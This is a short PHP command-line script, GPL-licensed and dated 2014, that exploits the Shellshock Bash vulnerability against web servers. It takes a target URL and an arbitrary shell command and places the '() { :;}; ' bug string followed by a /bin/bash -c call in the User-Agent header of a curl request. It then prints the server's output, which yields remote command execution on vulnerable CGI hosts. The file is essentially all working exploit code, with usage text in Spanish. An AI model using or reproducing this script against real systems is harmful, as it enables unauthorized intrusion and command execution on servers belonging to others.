<?php
/*
 * =============================================================================
 * «Copyright 2014 Jesús Omar Pérez Camargo»
 * email: jesus.perez.65535@gmail.com
 * facebook: https://www.facebook.com/elhombre.sonriente
 * google+: https://plus.google.com/116784166035161515634
 * =============================================================================
 *                               LICENSE GPL 
 * =============================================================================
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * =============================================================================
*/

if(!empty($argv))
{
	if(!empty($argv[1]) AND !empty($argv[2]))
	{
		$url = "$argv[1]";
		$bug = '() { :;}; ';
		$shell = " /bin/bash -c 'echo \"Content-type: text/plain\"; echo; echo; $argv[2] '";
		$handler = curl_init(); 
		curl_setopt($handler, CURLOPT_URL, $url);
		curl_setopt($handler, CURLOPT_USERAGENT, $bug.$shell);
		$response = curl_exec ($handler);  
		curl_close($handler); 
		echo $response;
	}
	else
	{
		echo "\nBienvenido\n";
		echo "por favor recuerda ejecutar el script de esta forma\n";
		echo "\nphp shellshock.php [UrlSitioWeb] [Comando]\n\n";
	}
}
else
{
	echo "\nBienvenido\n";
	echo "por favor recuerda ejecutar el script de esta forma\n";
	echo "\nphp shellshock.php [UrlSitioWeb] [Comando]\n\n";
}
?>
